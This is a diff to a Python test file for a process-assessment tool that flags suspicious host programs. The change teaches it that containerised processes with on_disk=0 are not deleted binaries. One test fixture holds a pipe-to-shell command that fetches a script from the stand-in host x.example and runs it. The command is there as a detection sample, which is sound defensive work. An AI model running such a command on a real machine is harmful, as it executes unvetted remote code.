@@ -298,7 +298,7 @@ def test_redact_masks_secret_looking_parts():
 
 def test_assess_suspicious_signs():
     tmp = Owner(name="upd", path="/tmp/.x/upd")
-    gone = Owner(name="svc", path="/usr/bin/svc", on_disk="0")
+    gone = Owner(name="svc", path="/usr/bin/svc", on_disk="0", container=False)
     pipe = Owner(name="bash", path="/usr/bin/bash", cmdline="bash -c curl -s https://x.example/i | sh")
     for o in (tmp, gone, pipe):
         assessment, signals = assess([o], "other_program")
@@ -383,3 +383,23 @@ def test_summary_never_contains_the_command_line():
     c = hc_case(host_assessment="likely_benign", host_cmdline="curl --secret-thing https://x", host_agent_command="curl x")
     text = summarize(c, Assets())
     assert "found nothing suspicious" in text and "secret-thing" not in text and "curl x" not in text
+
+
+def test_container_processes_are_not_deleted_binaries():
+    """Measured: a local Jitsi stack's java/lua reported on_disk=0 because they run in Docker."""
+    jvb = Owner(name="java", path="/usr/lib/jvm/java-21/bin/java", on_disk="0", container=True)
+    assert assess([jvb], "other_program")[0] == "likely_benign"
+    gone = Owner(name="svc", path="/usr/bin/svc", on_disk="0", container=False)
+    assert assess([gone], "other_program")[0] == "suspicious"
+    old_row = Owner(name="svc", path="/usr/bin/svc", on_disk="0", container=None)   # log row without cgroup_path
+    assessment, signals = assess([old_row], "other_program")
+    assert assessment == "unclear" and "container" in signals[0]
+    tmp_in_container = Owner(name="x", path="/tmp/x", container=True)
+    assert assess([tmp_in_container], "other_program")[0] == "suspicious"
+
+
+def test_owner_reads_container_from_cgroup_path():
+    from tapwatch.hostctx import _owner
+    assert _owner({"name": "java", "cgroup_path": "/system.slice/docker-72ab.scope"}).container is True
+    assert _owner({"name": "curl", "cgroup_path": "/user.slice/user-1000.slice/app.slice/x.service"}).container is False
+    assert _owner({"name": "curl"}).container is None
